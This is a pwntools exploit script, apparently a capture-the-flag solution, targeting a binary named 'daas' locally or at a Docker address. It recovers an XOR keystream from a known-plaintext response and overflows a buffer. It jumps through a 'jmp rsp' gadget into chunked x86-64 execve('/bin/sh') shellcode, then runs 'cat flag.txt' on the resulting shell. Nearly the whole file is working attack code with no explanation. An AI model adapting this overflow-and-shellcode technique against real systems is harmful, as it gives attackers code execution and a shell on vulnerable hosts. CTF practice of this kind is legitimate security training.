#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from binascii import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './daas'

elf = context.binary = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("172.17.0.2",3141)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
continue
'''.format(**locals())

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
p.recvline()


p.sendline(hexlify(b"A"*16*3))
d = p.readline()

if args.REMOTE:
    d = p.readline()

r = d.strip().split(b"[")[1][:-1]

C2 = unhexlify(r)[16:32]
DA = byte_xor(C2, b"A"*16)
pad = b"A" * 16

p.readline()

shellcode = b"\x6a\x68\x90\x90\x90\x90\xeb\x10" \
            b"\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x90\x90\x90\x90\xeb\x10" \
            b"\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x90\x90\x90\x90\x90\xeb\x10" \
            b"\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x90\xeb\x10" \
            b"\x48\x89\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05\x90\x90"

jmp_rsp = next(elf.search(asm('jmp rsp')))
log.info(f"found jmp esp: {hex(jmp_rsp)}")

payload = byte_xor(DA,b"1"*16)
payload += pad
payload += byte_xor(DA,b"2"*16) 
payload += pad
payload += byte_xor(DA,b"3"*16) 
payload += pad
payload += byte_xor(DA,b"4"*16) 
payload += pad
payload += byte_xor(DA,b"5"*16) 
payload += pad
log.info(f"overflow offset: {len(payload)}")
payload += byte_xor(DA, p64(jmp_rsp) + shellcode[0:8]) 
payload += pad #p64(jmp_rsp) + pad
payload += byte_xor(DA, shellcode[8:24]) 
payload += pad
payload += byte_xor(DA, shellcode[24:40]) 
payload += pad
payload += byte_xor(DA, shellcode[40:56]) 
payload += pad
payload += byte_xor(DA, shellcode[56:72]) 
payload += pad


log.info("sending payload...")
p.sendline(hexlify(payload))
p.readline()
p.readline()
p.sendline(b"cat flag.txt")
p.readline()
p.readline()
